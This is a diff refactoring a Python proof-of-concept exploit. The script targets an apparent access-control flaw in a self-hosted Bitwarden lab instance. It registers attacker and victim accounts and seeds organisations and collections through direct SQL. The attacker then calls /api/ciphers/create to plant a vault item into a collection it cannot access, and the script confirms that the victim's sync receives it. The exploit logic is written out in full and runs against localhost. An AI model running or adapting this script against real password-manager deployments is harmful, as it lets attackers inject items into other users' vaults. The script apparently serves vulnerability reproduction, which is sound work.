@@ -230,45 +230,181 @@ import base64
 import json
 import os
 import subprocess
-import sys
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
 import uuid
+from dataclasses import dataclass
+from pathlib import Path
+from typing import NoReturn
 
 WITNESS = "BITWARDEN-CIPHER-CREATE-ACL-WITNESS"
 LABEL = "BITWARDEN-CIPHER-CREATE-ACL"
-BW = os.environ.get("BW_URL", "http://127.0.0.1:18160").rstrip("/")
-COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "bitwarden-cipher-create-acl")
-HERE = os.path.dirname(os.path.abspath(__file__))
+DEFAULT_BW_URL = "http://127.0.0.1:18160"
+DEFAULT_COMPOSE_PROJECT = "bitwarden-cipher-create-acl"
 DB_NAME = "bitwarden_vault"
 DB_USER = "bitwarden"
 DB_PASS = "super_strong_password"
 ATTACKER_EMAIL = "attacker@lab.invalid"
 VICTIM_EMAIL = "victim@lab.invalid"
 PASSWORD_HASH = "LabPass123!LabPass123!LabPass123!LabPass123!"
-READY_TIMEOUT = int(os.environ.get("BW_READY_TIMEOUT", "1500"))
+CLIENT_VERSION = "2026.9.2"
+DEVICE_TYPE = "9"
+DEVICE_NAME = "lab"
+CLIENT_ID = "web"
+KDF_TYPE = 0
+KDF_ITERATIONS = 600000
+ORG_USER_CONFIRMED = 2
+ORG_USER_TYPE_USER = 2
+MIN_TABLE_COUNT = 60
+HTTP_SKIP_CODES = (0, 404, 502, 503)
+PATH_ALIVE = "/alive"
+PATH_CONFIG = "/api/config"
+PATH_CIPHERS = "/api/ciphers"
+PATH_SYNC = "/api/sync"
+PATH_CIPHER_CREATE = "/api/ciphers/create"
+REGISTER_SEND_PATHS = (
+    "/identity/accounts/register/send-verification-email",
+    "/accounts/register/send-verification-email",
+)
+TOKEN_PATHS = ("/identity/connect/token", "/connect/token")
+MIGRATE_TABLES = frozenset(
+    {
+        "user",
+        "organization",
+        "organizationuser",
+        "organizationdomain",
+        "collection",
+        "collectionusers",
+        "collectioncipher",
+        "cipher",
+        "policy",
+    }
+)
+REQUIRED_TABLES = (
+    "user",
+    "organization",
+    "organizationuser",
+    "collection",
+    "collectionusers",
+    "collectioncipher",
+    "cipher",
+)
+ORG_BOOL_TRUE = frozenset(
+    {
+        "Enabled",
+        "SelfHost",
+        "UsePasswordManager",
+        "UseTotp",
+        "UseApi",
+        "AllowAdminAccessToAllCollectionItems",
+    }
+)
+ORG_REQUIRED_STRINGS = {
+    "Name": "Lab Org",
+    "BillingEmail": "billing@lab.invalid",
+    "Plan": "Teams Annually",
+}
+ORG_REQUIRED_INTS = {
+    "PlanType": 18,
+    "Status": 1,
+    "Seats": 10,
+    "MaxCollections": 20,
+    "MaxStorageGb": 1,
+}
+ORG_NULL_COLUMNS = frozenset(
+    {
+        "Gateway",
+        "GatewayCustomerId",
+        "GatewaySubscriptionId",
+        "Identifier",
+        "LicenseKey",
+        "PrivateKey",
+        "PublicKey",
+        "ReferenceData",
+        "TwoFactorProviders",
+        "BusinessName",
+        "BusinessAddress1",
+        "BusinessAddress2",
+        "BusinessAddress3",
+        "BusinessCountry",
+        "BusinessTaxNumber",
+        "Storage",
+        "MaxAutoscaleSeats",
+        "MaxAutoscaleSmSeats",
+        "MaxAutoscaleSmServiceAccounts",
+        "SmSeats",
+        "SmServiceAccounts",
+        "OwnersNotifiedOfAutoscaling",
+        "ExpirationDate",
+    }
+)
+JsonDict = dict[str, object]
+CipherRow = tuple[str, str]
+
+
+@dataclass(frozen=True)
+class LabConfig:
+    bw_url: str
+    compose_project: str
+    here: Path
+    ready_timeout: int
+
+    @classmethod
+    def from_env(cls) -> LabConfig:
+        return cls(
+            bw_url=os.environ.get("BW_URL", DEFAULT_BW_URL).rstrip("/"),
+            compose_project=os.environ.get("COMPOSE_PROJECT_NAME", DEFAULT_COMPOSE_PROJECT),
+            here=Path(__file__).resolve().parent,
+            ready_timeout=int(os.environ.get("BW_READY_TIMEOUT", "1500")),
+        )
+
+
+@dataclass(frozen=True)
+class SqlExec:
+    mysql_rc: int
+    maria_rc: int
+    stdout: str
+    stderr: str
+
+    @property
+    def ok(self) -> bool:
+        return self.mysql_rc == 0 or self.maria_rc == 0
+
+
+@dataclass(frozen=True)
+class OrgIds:
+    org: str
+    org2: str
+    col_a: str
+    col_b: str
+    col_c: str
+    ou_att: str
+    ou_vic: str
+
+
+CFG = LabConfig.from_env()
 
 
 def log(msg: str) -> None:
     print(msg, flush=True)
 
 
-def fail(reason: str) -> None:
+def fail(reason: str) -> NoReturn:
     log(f"FAIL {LABEL} {reason}")
     raise SystemExit(1)
 
 
-def success(detail: str) -> None:
+def success(detail: str) -> int:
     log(f"SUCCESS {LABEL} {detail} {WITNESS}")
-    raise SystemExit(0)
+    return 0
 
 
 def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
     return subprocess.run(
-        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
-        cwd=HERE,
+        ["docker", "compose", "-p", CFG.compose_project, *args],
+        cwd=CFG.here,
         text=True,
         capture_output=True,
         timeout=timeout,
@@ -286,19 +422,19 @@ def http(
     method: str,
     path: str,
     token: str | None = None,
-    payload: dict | None = None,
-    form: dict | None = None,
+    payload: JsonDict | None = None,
+    form: dict[str, str] | None = None,
     timeout: int = 60,
     raw_body: bytes | None = None,
     content_type: str | None = None,
 ) -> tuple[int, str]:
-    url = path if path.startswith("http") else f"{BW}{path}"
+    url = path if path.startswith("http") else f"{CFG.bw_url}{path}"
     headers = {
         "Accept": "application/json",
-        "Bitwarden-Client-Version": "2026.9.2",
-        "Device-Type": "9",
+        "Bitwarden-Client-Version": CLIENT_VERSION,
+        "Device-Type": DEVICE_TYPE,
     }
-    data = None
+    data: bytes | None = None
     if token:
         headers["Authorization"] = f"Bearer {token}"
     if form is not None:
@@ -314,22 +450,62 @@ def http(
     req = urllib.request.Request(url, data=data, headers=headers, method=method)
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
-            return resp.getcode(), resp.read().decode("utf-8", "replace")
+            return int(resp.getcode()), resp.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode("utf-8", "replace")
-    except Exception as exc:
+        return int(exc.code), exc.read().decode("utf-8", "replace")
+    except (urllib.error.URLError, TimeoutError, OSError) as exc:
         return 0, str(exc)
 
 
+def _sql_argv(client: str, sql: str) -> list[str]:
+    return [
+        "exec",
+        "-T",
+        "db",
+        client,
+        f"-u{DB_USER}",
+        f"-p{DB_PASS}",
+        "--batch",
+        "--raw",
+        "--skip-column-names",
+        DB_NAME,
+        "-e",
+        sql,
+    ]
+
+
+def run_sql(sql: str, timeout: int = 60) -> SqlExec:
+    cmd = compose(*_sql_argv("mysql", sql), timeout=timeout)
+    if cmd.returncode == 0:
+        return SqlExec(cmd.returncode, 0, cmd.stdout, cmd.stderr or "")
+    alt = compose(*_sql_argv("mariadb", sql), timeout=timeout)
+    if alt.returncode == 0:
+        return SqlExec(cmd.returncode, alt.returncode, alt.stdout, alt.stderr or "")
+    err = f"{cmd.stderr or ''}\n{alt.stderr or ''}"
+    return SqlExec(cmd.returncode, alt.returncode, "", err)
+
+
+def mysql(sql: str, timeout: int = 60) -> str:
+    result = run_sql(sql, timeout=timeout)
+    if not result.ok:
+        fail(
+            f"sql failed rc={result.mysql_rc}/{result.maria_rc} "
+            f"err={result.stderr[:500]} sql={sql[:240]}"
+        )
+    return result.stdout
+
+
 def tables_ready() -> bool:
-    try:
-        raw = mysql("SHOW TABLES;")
-    except SystemExit:
+    result = run_sql("SHOW TABLES;")
+    if not result.ok:
         return False
-    names = {line.strip().replace("`", "").lower() for line in raw.splitlines() if line.strip()}
-    needed = {"user", "organization", "organizationuser", "organizationdomain", "collection", "collectionusers", "collectioncipher", "cipher", "policy"}
-    missing = needed - names
-    if missing or len(names) < 60:
+    names = {
+        line.strip().replace("`", "").lower()
+        for line in result.stdout.splitlines()
+        if line.strip()
+    }
+    missing = MIGRATE_TABLES - names
+    if missing or len(names) < MIN_TABLE_COUNT:
         log(f"IOC migrate-wait n={len(names)} missing={sorted(missing)}")
         return False
     log(f"IOC migrate-up tables={len(names)}")
@@ -337,24 +513,31 @@ def tables_ready() -> bool:
 
 
 def wait_lite() -> None:
-    deadline = time.time() + READY_TIMEOUT
+    deadline = time.time() + CFG.ready_timeout
     n = 0
     cfg_body = ""
     cfg_code = 0
     while time.time() < deadline:
         n += 1
-        alive_code, _ = http("GET", "/alive", timeout=8)
-        cfg_code, cfg_body = http("GET", "/api/config", timeout=8)
-        migrated = tables_ready() if (alive_code == 200 or cfg_code == 200) else False
-        log(f"IOC lite-wait n={n} alive={alive_code} config={cfg_code} migrated={int(migrated)}")
-        if (alive_code == 200 or cfg_code == 200) and migrated:
+        alive_code, _ = http("GET", PATH_ALIVE, timeout=8)
+        cfg_code, cfg_body = http("GET", PATH_CONFIG, timeout=8)
+        http_up = alive_code == 200 or cfg_code == 200
+        migrated = tables_ready() if http_up else False
+        log(
+            f"IOC lite-wait n={n} alive={alive_code} config={cfg_code} "
+            f"migrated={int(migrated)}"
+        )
+        if http_up and migrated:
             log(f"IOC lite-up alive={alive_code} config={cfg_code}")
             return
         time.sleep(5)
-    fail(f"lite not ready after {READY_TIMEOUT}s last-config={cfg_code} body={cfg_body[:180]}")
+    fail(
+        f"lite not ready after {CFG.ready_timeout}s last-config={cfg_code} "
+        f"body={cfg_body[:180]}"
+    )
 
 
-def parse_maybe_json(body: str):
+def parse_maybe_json(body: str) -> object:
     text = body.strip()
     if not text:
         return None
@@ -364,15 +547,44 @@ def parse_maybe_json(body: str):
         return text
 
 
-def first_ok(method: str, paths: list[str], **kwargs) -> tuple[str, int, str]:
+def first_ok(
+    method: str,
+    paths: list[str] | tuple[str, ...],
+    token: str | None = None,
+    payload: JsonDict | None = None,
+    form: dict[str, str] | None = None,
+    timeout: int = 60,
+) -> tuple[str, int, str]:
     last = ("", 0, "")
     for path in paths:
-        code, body = http(method, path, **kwargs)
+        code, body = http(
+            method,
+            path,
+            token=token,
+            payload=payload,
+            form=form,
+            timeout=timeout,
+        )
         last = (path, code, body)
         log(f"IOC http {method} {path} -> {code}")
-        if code not in (0, 404, 502, 503):
+        if code not in HTTP_SKIP_CODES:
             return path, code, body
     return last
+
+
+def _email_token_from_body(send_body: str) -> str:
+    token_obj = parse_maybe_json(send_body)
+    if isinstance(token_obj, str):
+        return token_obj.strip().strip('"')
+    if isinstance(token_obj, dict):
+        raw = (
+            token_obj.get("token")
+            or token_obj.get("emailVerificationToken")
+            or token_obj.get("captchaBypassToken")
+            or ""
+        )
+        return str(raw) if raw else ""
+    return send_body.strip().strip('"')
 
 
 def register_user(email: str, name: str) -> None:
@@ -380,13 +592,17 @@ def register_user(email: str, name: str) -> None:
     for attempt in range(1, 37):
         send_path, send_code, send_body = first_ok(
             "POST",
-            [
-                "/identity/accounts/register/send-verification-email",
-                "/accounts/register/send-verification-email",
-            ],
-            payload={"email": email, "name": name, "receiveMarketingEmails": False},
+            REGISTER_SEND_PATHS,
+            payload={
+                "email": email,
+                "name": name,
+                "receiveMarketingEmails": False,
+            },
         )
-        log(f"IOC register-send email={email} attempt={attempt} path={send_path} http={send_code} body={send_body[:180]}")
+        log(
+            f"IOC register-send email={email} attempt={attempt} path={send_path} "
+            f"http={send_code} body={send_body[:180]}"
+        )
         if send_code == 400 and "already taken" in send_body.lower():
             log(f"IOC register-exists email={email}")
             return
@@ -398,21 +614,10 @@ def register_user(email: str, name: str) -> None:
         fail(f"register send-verification-email http={send_code} body={send_body[:300]}")
     else:
         fail(f"register send-verification-email http={send_code} body={send_body[:300]}")
-    token_obj = parse_maybe_json(send_body)
-    if isinstance(token_obj, str):
-        email_token = token_obj.strip().strip('"')
-    elif isinstance(token_obj, dict):
-        email_token = (
-            token_obj.get("token")
-            or token_obj.get("emailVerificationToken")
-            or token_obj.get("captchaBypassToken")
-            or ""
-        )
-    else:
-        email_token = send_body.strip().strip('"')
+    email_token = _email_token_from_body(send_body)
     if not email_token:
         fail(f"register token empty email={email} body={send_body[:300]}")
-    finish = {
+    finish: JsonDict = {
         "email": email,
         "emailVerificationToken": email_token,
         "masterPasswordHash": PASSWORD_HASH,
@@ -421,8 +626,8 @@ def register_user(email: str, name: str) -> None:
             "publicKey": base64.b64encode(os.urandom(32)).decode("ascii"),
             "encryptedPrivateKey": enc_blob(),
         },
-        "kdf": 0,
-        "kdfIterations": 600000,
+        "kdf": KDF_TYPE,
+        "kdfIterations": KDF_ITERATIONS,
     }
     finish_base = send_path.rsplit("/register/", 1)[0]
     _, finish_code, finish_body = first_ok(
@@ -441,16 +646,12 @@ def token_for(email: str) -> str:
         "username": email,
         "password": PASSWORD_HASH,
         "scope": "api offline_access",
-        "client_id": "web",
-        "deviceType": "9",
+        "client_id": CLIENT_ID,
+        "deviceType": DEVICE_TYPE,
         "deviceIdentifier": str(uuid.uuid4()),
-        "deviceName": "lab",
+        "deviceName": DEVICE_NAME,
     }
-    _, code, body = first_ok(
-        "POST",
-        ["/identity/connect/token", "/connect/token"],
-        form=form,
-    )
+    _, code, body = first_ok("POST", TOKEN_PATHS, form=form)
     log(f"IOC token email={email} http={code} body={body[:180]}")
     if code != 200:
         fail(f"token http={code} email={email} body={body[:400]}")
@@ -460,66 +661,25 @@ def token_for(email: str) -> str:
     return str(data["access_token"])
 
 
-def mysql(sql: str, timeout: int = 60) -> str:
-    cmd = compose(
-        "exec",
-        "-T",
-        "db",
-        "mysql",
-        f"-u{DB_USER}",
-        f"-p{DB_PASS}",
-        "--batch",
-        "--raw",
-        "--skip-column-names",
-        DB_NAME,
-        "-e",
-        sql,
-        timeout=timeout,
-    )
-    if cmd.returncode != 0:
-        alt = compose(
-            "exec",
-            "-T",
-            "db",
-            "mariadb",
-            f"-u{DB_USER}",
-            f"-p{DB_PASS}",
-            "--batch",
-            "--raw",
-            "--skip-column-names",
-            DB_NAME,
-            "-e",
-            sql,
-            timeout=timeout,
-        )
-        if alt.returncode != 0:
-            err = (cmd.stderr or "") + "\n" + (alt.stderr or "")
-            fail(f"sql failed rc={cmd.returncode}/{alt.returncode} err={err[:500]} sql={sql[:240]}")
-        return alt.stdout
-    return cmd.stdout
-
-
 def table_map() -> dict[str, str]:
     raw = mysql("SHOW TABLES;")
     names = [line.strip() for line in raw.splitlines() if line.strip()]
     log(f"IOC tables count={len(names)}")
-    wanted = {
-        "user": None,
-        "organization": None,
-        "organizationuser": None,
-        "collection": None,
-        "collectionusers": None,
-        "collectioncipher": None,
-        "cipher": None,
-    }
+    wanted: dict[str, str | None] = {key: None for key in REQUIRED_TABLES}
     for name in names:
         key = name.replace("`", "").lower()
         if key in wanted and wanted[key] is None:
             wanted[key] = name
-    missing = [k for k, v in wanted.items() if not v]
+    resolved: dict[str, str] = {}
+    missing: list[str] = []
+    for key, value in wanted.items():
+        if value is None:
+            missing.append(key)
+        else:
+            resolved[key] = value
     if missing:
         fail(f"missing tables {missing} have={names[:40]}")
-    return wanted  # type: ignore[return-value]
+    return resolved
 
 
 def qident(name: str) -> str:
@@ -539,14 +699,55 @@ def user_id(tables: dict[str, str], email: str) -> str:
     return uid
 
 
-def seed_orgs(tables: dict[str, str], attacker_id: str, victim_id: str) -> dict[str, str]:
-    org_id = str(uuid.uuid4())
-    org2_id = str(uuid.uuid4())
-    col_a = str(uuid.uuid4())
-    col_b = str(uuid.uuid4())
-    col_c = str(uuid.uuid4())
-    ou_att = str(uuid.uuid4())
-    ou_vic = str(uuid.uuid4())
+def _org_column_value(col: str, org_name: str, now: str) -> str:
+    if col in ORG_REQUIRED_STRINGS:
+        if col == "Name":
+            return sql_quote(org_name)
+        return sql_quote(ORG_REQUIRED_STRINGS[col])
+    if col in ORG_REQUIRED_INTS:
+        return str(ORG_REQUIRED_INTS[col])
+    if col in ("CreationDate", "RevisionDate"):
+        return sql_quote(now)
+    if col in ORG_BOOL_TRUE:
+        return "1"
+    if col.endswith("Date") or col in ORG_NULL_COLUMNS:
+        return "NULL"
+    return "0"
+
+
+def _org_insert_sql(table: str, columns: list[str], oid: str, name: str, now: str) -> str:
+    cols = ["Id"]
+    vals = [sql_quote(oid)]
+    for col in columns:
+        if col == "Id":
+            continue
+        cols.append(col)
+        vals.append(_org_column_value(col, name, now))
+    col_sql = ", ".join(qident(c) for c in cols)
+    val_sql = ", ".join(vals)
+    return f"INSERT INTO {table} ({col_sql}) VALUES ({val_sql});"
+
+
+def _ou_insert_sql(table: str, ouid: str, oid: str, uid: str, now: str) -> str:
+    return (
+        f"INSERT INTO {table} "
+        f"(Id, OrganizationId, UserId, Email, `Key`, Status, Type, CreationDate, RevisionDate, "
+        f"AccessSecretsManager, AccessPam) VALUES ("
+        f"{sql_quote(ouid)}, {sql_quote(oid)}, {sql_quote(uid)}, NULL, {sql_quote(enc_blob())}, "
+        f"{ORG_USER_CONFIRMED}, {ORG_USER_TYPE_USER}, {sql_quote(now)}, {sql_quote(now)}, 0, 0);"
+    )
+
+
+def seed_orgs(tables: dict[str, str], attacker_id: str, victim_id: str) -> OrgIds:
+    ids = OrgIds(
+        org=str(uuid.uuid4()),
+        org2=str(uuid.uuid4()),
+        col_a=str(uuid.uuid4()),
+        col_b=str(uuid.uuid4()),
+        col_c=str(uuid.uuid4()),
+        ou_att=str(uuid.uuid4()),
+        ou_vic=str(uuid.uuid4()),
+    )
     now = time.strftime("%Y-%m-%d %H:%M:%S")
     ot = qident(tables["organization"])
     out = qident(tables["organizationuser"])
@@ -557,121 +758,36 @@ def seed_orgs(tables: dict[str, str], attacker_id: str, victim_id: str) -> dict[
     col_names = [line.split("\t")[0] for line in org_cols.splitlines() if line.strip()]
     log(f"IOC organization-columns n={len(col_names)}")
 
-    bool_true = {
-        "Enabled",
-        "SelfHost",
-        "UsePasswordManager",
-        "UseTotp",
-        "UseApi",
-        "AllowAdminAccessToAllCollectionItems",
-    }
-    required_strings = {
-        "Name": "Lab Org",
-        "BillingEmail": "billing@lab.invalid",
-        "Plan": "Teams Annually",
-    }
-    required_ints = {
-        "PlanType": 18,
-        "Status": 1,
-        "Seats": 10,
-        "MaxCollections": 20,
-        "MaxStorageGb": 1,
-    }
-
-    def org_insert(oid: str, name: str) -> str:
-        cols = ["Id"]
-        vals = [sql_quote(oid)]
-        for col in col_names:
-            if col == "Id":
-                continue
-            if col in required_strings:
-                value = sql_quote(name if col == "Name" else required_strings[col])
-            elif col in required_ints:
-                value = str(required_ints[col])
-            elif col in ("CreationDate", "RevisionDate"):
-                value = sql_quote(now)
-            elif col in bool_true:
-                value = "1"
-            elif col.endswith("Date") or col in (
-                "Gateway",
-                "GatewayCustomerId",
-                "GatewaySubscriptionId",
-                "Identifier",
-                "LicenseKey",
-                "PrivateKey",
-                "PublicKey",
-                "ReferenceData",
-                "TwoFactorProviders",
-                "BusinessName",
-                "BusinessAddress1",
-                "BusinessAddress2",
-                "BusinessAddress3",
-                "BusinessCountry",
-                "BusinessTaxNumber",
-                "Storage",
-                "MaxAutoscaleSeats",
-                "MaxAutoscaleSmSeats",
-                "MaxAutoscaleSmServiceAccounts",
-                "SmSeats",
-                "SmServiceAccounts",
-                "OwnersNotifiedOfAutoscaling",
-                "ExpirationDate",
-            ):
-                value = "NULL"
-            else:
-                # remaining flags default off
-                value = "0"
-            cols.append(qident(col).strip("`") if False else col)
-            vals.append(value)
-        col_sql = ", ".join(qident(c) for c in cols)
-        val_sql = ", ".join(vals)
-        return f"INSERT INTO {ot} ({col_sql}) VALUES ({val_sql});"
-
-    mysql(org_insert(org_id, "Lab Org One"))
-    mysql(org_insert(org2_id, "Lab Org Two"))
-
-    def ou_insert(ouid: str, oid: str, uid: str) -> str:
-        return (
-            f"INSERT INTO {out} "
-            f"(Id, OrganizationId, UserId, Email, `Key`, Status, Type, CreationDate, RevisionDate, "
-            f"AccessSecretsManager, AccessPam) VALUES ("
-            f"{sql_quote(ouid)}, {sql_quote(oid)}, {sql_quote(uid)}, NULL, {sql_quote(enc_blob())}, "
-            f"2, 2, {sql_quote(now)}, {sql_quote(now)}, 0, 0);"
-        )
-
-    mysql(ou_insert(ou_att, org_id, attacker_id))
-    mysql(ou_insert(ou_vic, org_id, victim_id))
+    mysql(_org_insert_sql(ot, col_names, ids.org, "Lab Org One", now))
+    mysql(_org_insert_sql(ot, col_names, ids.org2, "Lab Org Two", now))
+    mysql(_ou_insert_sql(out, ids.ou_att, ids.org, attacker_id, now))
+    mysql(_ou_insert_sql(out, ids.ou_vic, ids.org, victim_id, now))
 
     dummy_name = enc_blob(b"collection")
     mysql(
         f"INSERT INTO {ct} (Id, OrganizationId, Name, CreationDate, RevisionDate, Type) VALUES "
-        f"({sql_quote(col_a)}, {sql_quote(org_id)}, {sql_quote(dummy_name)}, {sql_quote(now)}, {sql_quote(now)}, 0), "
-        f"({sql_quote(col_b)}, {sql_quote(org_id)}, {sql_quote(dummy_name)}, {sql_quote(now)}, {sql_quote(now)}, 0), "
-        f"({sql_quote(col_c)}, {sql_quote(org2_id)}, {sql_quote(dummy_name)}, {sql_quote(now)}, {sql_quote(now)}, 0);"
+        f"({sql_quote(ids.col_a)}, {sql_quote(ids.org)}, {sql_quote(dummy_name)}, "
+        f"{sql_quote(now)}, {sql_quote(now)}, 0), "
+        f"({sql_quote(ids.col_b)}, {sql_quote(ids.org)}, {sql_quote(dummy_name)}, "
+        f"{sql_quote(now)}, {sql_quote(now)}, 0), "
+        f"({sql_quote(ids.col_c)}, {sql_quote(ids.org2)}, {sql_quote(dummy_name)}, "
+        f"{sql_quote(now)}, {sql_quote(now)}, 0);"
     )
     mysql(
-        f"INSERT INTO {cut} (CollectionId, OrganizationUserId, ReadOnly, HidePasswords, Manage) VALUES "
-        f"({sql_quote(col_a)}, {sql_quote(ou_att)}, 0, 0, 0), "
-        f"({sql_quote(col_b)}, {sql_quote(ou_vic)}, 0, 0, 0);"
+        f"INSERT INTO {cut} (CollectionId, OrganizationUserId, ReadOnly, HidePasswords, Manage) "
+        f"VALUES "
+        f"({sql_quote(ids.col_a)}, {sql_quote(ids.ou_att)}, 0, 0, 0), "
+        f"({sql_quote(ids.col_b)}, {sql_quote(ids.ou_vic)}, 0, 0, 0);"
     )
-    ids = {
-        "org": org_id,
-        "org2": org2_id,
-        "col_a": col_a,
-        "col_b": col_b,
-        "col_c": col_c,
-        "ou_att": ou_att,
-        "ou_vic": ou_vic,
-    }
     log(
         "IOC seed "
-        f"org={org_id} org2={org2_id} colA={col_a} colB={col_b} colC={col_c} "
-        f"ou_att={ou_att} ou_vic={ou_vic}"
+        f"org={ids.org} org2={ids.org2} colA={ids.col_a} colB={ids.col_b} colC={ids.col_c} "
+        f"ou_att={ids.ou_att} ou_vic={ids.ou_vic}"
     )
     return ids
 
 
-def cipher_body(org_id: str, collection_id: str) -> dict:
+def cipher_body(org_id: str, collection_id: str) -> JsonDict:
     name = enc_blob(b"name")
     notes = enc_blob(WITNESS.encode("ascii"))
     username = enc_blob(WITNESS.encode("ascii"))
@@ -698,12 +814,21 @@ def cipher_body(org_id: str, collection_id: str) -> dict:
     }
 
 
-def collectioncipher_rows(tables: dict[str, str], collection_id: str) -> list[tuple[str, str]]:
+def create_cipher(token: str, org_id: str, collection_id: str) -> tuple[int, str]:
+    return http(
+        "POST",
+        PATH_CIPHER_CREATE,
+        token=token,
+        payload=cipher_body(org_id, collection_id),
+    )
+
+
+def collectioncipher_rows(tables: dict[str, str], collection_id: str) -> list[CipherRow]:
     cct = qident(tables["collectioncipher"])
     raw = mysql(
         f"SELECT CipherId, CollectionId FROM {cct} WHERE CollectionId={sql_quote(collection_id)};"
     )
-    rows = []
+    rows: list[CipherRow] = []
     for line in raw.splitlines():
         parts = line.strip().split("\t")
         if len(parts) >= 2:
@@ -716,19 +841,43 @@ def ids_in_body(body: str, cipher_id: str) -> bool:
 
 
 def victim_has_cipher(token: str, cipher_id: str) -> bool:
-    c_code, c_body = http("GET", "/api/ciphers", token=token)
-    s_code, s_body = http("GET", "/api/sync", token=token)
+    c_code, c_body = http("GET", PATH_CIPHERS, token=token)
+    s_code, s_body = http("GET", PATH_SYNC, token=token)
     has_list = c_code == 200 and ids_in_body(c_body, cipher_id)
     has_sync = s_code == 200 and ids_in_body(s_body, cipher_id)
     has_witness = WITNESS in c_body or WITNESS in s_body
     log(
         f"IOC victim-fetch ciphers={c_code} sync={s_code} "
-        f"has-id-list={int(has_list)} has-id-sync={int(has_sync)} witness-in-body={int(has_witness)}"
+        f"has-id-list={int(has_list)} has-id-sync={int(has_sync)} "
+        f"witness-in-body={int(has_witness)}"
     )
     return has_list or has_sync
 
 
-def main() -> None:
+def _readonly_cipher_id(
+    ro_code: int,
+    ro_body: str,
+    ro_rows: list[CipherRow],
+    after: list[CipherRow],
+) -> str | None:
+    ro_id: str | None = None
+    if ro_code == 200:
+        parsed = parse_maybe_json(ro_body)
+        if isinstance(parsed, dict):
+            nested = parsed.get("cipher")
+            nested_id = nested.get("id") if isinstance(nested, dict) else None
+            raw_id = parsed.get("id") or nested_id
+            if raw_id:
+                ro_id = str(raw_id)
+    if not ro_id and len(ro_rows) >= 2:
+        planted = {row[0] for row in after}
+        for cid, _collection_id in ro_rows:
+            if cid not in planted:
+                return cid
+    return ro_id
+
+
+def main() -> int:
     wait_lite()
     register_user(ATTACKER_EMAIL, "attacker")
     register_user(VICTIM_EMAIL, "victim")
@@ -741,29 +890,21 @@ def main() -> None:
     att_token = token_for(ATTACKER_EMAIL)
     vic_token = token_for(VICTIM_EMAIL)
 
-    # Negative: attacker is not in org2.
-    neg_code, neg_body = http(
-        "POST",
-        "/api/ciphers/create",
-        token=att_token,
-        payload=cipher_body(ids["org2"], ids["col_c"]),
+    neg_code, neg_body = create_cipher(att_token, ids.org2, ids.col_c)
+    neg_rows = collectioncipher_rows(tables, ids.col_c)
+    log(
+        f"IOC negative-create http={neg_code} body={neg_body[:180]} "
+        f"collectioncipher={len(neg_rows)}"
     )
-    neg_rows = collectioncipher_rows(tables, ids["col_c"])
-    log(f"IOC negative-create http={neg_code} body={neg_body[:180]} collectioncipher={len(neg_rows)}")
     if neg_code != 404 or neg_rows:
         fail(
             f"negative expected 404 and no CollectionCipher got http={neg_code} "
             f"rows={len(neg_rows)} body={neg_body[:300]}"
         )
 
-    before = collectioncipher_rows(tables, ids["col_b"])
-    create_code, create_body = http(
-        "POST",
-        "/api/ciphers/create",
-        token=att_token,
-        payload=cipher_body(ids["org"], ids["col_b"]),
-    )
-    after = collectioncipher_rows(tables, ids["col_b"])
+    before = collectioncipher_rows(tables, ids.col_b)
+    create_code, create_body = create_cipher(att_token, ids.org, ids.col_b)
+    after = collectioncipher_rows(tables, ids.col_b)
     log(
         f"IOC create-noaccess http={create_code} body={create_body[:220]} "
         f"collectioncipher-before={len(before)} after={len(after)}"
@@ -776,7 +917,7 @@ def main() -> None:
     victim_ok = victim_has_cipher(vic_token, cipher_id)
     log(
         f"IOC users attacker={ATTACKER_EMAIL} victim={VICTIM_EMAIL} "
-        f"org={ids['org']} colA={ids['col_a']} colB={ids['col_b']} "
+        f"org={ids.org} colA={ids.col_a} colB={ids.col_b} "
         f"create-http={create_code} collectioncipher={len(after)} "
         f"victim-sync-has-cipher={'yes' if victim_ok else 'no'} cipher={cipher_id}"
     )
@@ -785,37 +926,21 @@ def main() -> None:
     if create_code not in (200, 404):
         fail(f"unexpected create status {create_code} body={create_body[:300]}")
 
-    # Optional: ReadOnly on B should return 200 and still plant.
     mysql(
         f"INSERT INTO {qident(tables['collectionusers'])} "
         f"(CollectionId, OrganizationUserId, ReadOnly, HidePasswords, Manage) VALUES "
-        f"({sql_quote(ids['col_b'])}, {sql_quote(ids['ou_att'])}, 1, 0, 0);"
+        f"({sql_quote(ids.col_b)}, {sql_quote(ids.ou_att)}, 1, 0, 0);"
     )
-    ro_code, ro_body = http(
-        "POST",
-        "/api/ciphers/create",
-        token=att_token,
-        payload=cipher_body(ids["org"], ids["col_b"]),
-    )
-    ro_rows = collectioncipher_rows(tables, ids["col_b"])
-    ro_id = None
-    if ro_code == 200:
-        parsed = parse_maybe_json(ro_body)
-        if isinstance(parsed, dict):
-            ro_id = parsed.get("id") or (parsed.get("cipher") or {}).get("id")
-    if not ro_id and len(ro_rows) >= 2:
-        planted = {row[0] for row in after}
-        for cid, _ in ro_rows:
-            if cid not in planted:
-                ro_id = cid
-                break
+    ro_code, ro_body = create_cipher(att_token, ids.org, ids.col_b)
+    ro_rows = collectioncipher_rows(tables, ids.col_b)
+    ro_id = _readonly_cipher_id(ro_code, ro_body, ro_rows, after)
     ro_victim = bool(ro_id) and victim_has_cipher(vic_token, str(ro_id))
     log(
         f"IOC readonly-create http={ro_code} collectioncipher={len(ro_rows)} "
         f"readonly-id={ro_id} victim-has={int(ro_victim)}"
     )
 
-    success(
+    return success(
         f"create-http={create_code} collectioncipher={len(after)} "
         f"victim-sync-has-cipher=yes cipher={cipher_id} "
         f"negative-http={neg_code} readonly-http={ro_code}"
@@ -824,7 +949,7 @@ def main() -> None:
 
 if __name__ == "__main__":
     try:
-        main()
+        raise SystemExit(main())
     except SystemExit:
         raise
     except Exception as exc:
